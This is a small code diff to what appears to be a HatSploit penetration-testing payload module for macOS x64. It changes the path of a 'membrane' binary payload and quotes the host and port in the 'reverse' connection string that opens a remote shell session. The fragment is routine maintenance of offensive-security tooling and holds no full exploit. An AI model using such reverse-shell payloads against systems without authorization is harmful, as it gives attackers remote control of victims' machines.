@@ -74,7 +74,7 @@ class HatSploitPayload(Payload, StringTools, TCPClient):
         local_port = self.xor_string(local_port)
 
         self.output_process("Generating payload...")
-        with open('data/membrane/macos/x64/membrane.bin', 'rb') as f:
+        with open('data/membrane/macos/x64/membrane', 'rb') as f:
             payload = f.read()
 
-        return payload, f"reverse {local_host} {local_port}", HatSploitSession
+        return payload, f"reverse '{local_host}' '{local_port}'", HatSploitSession
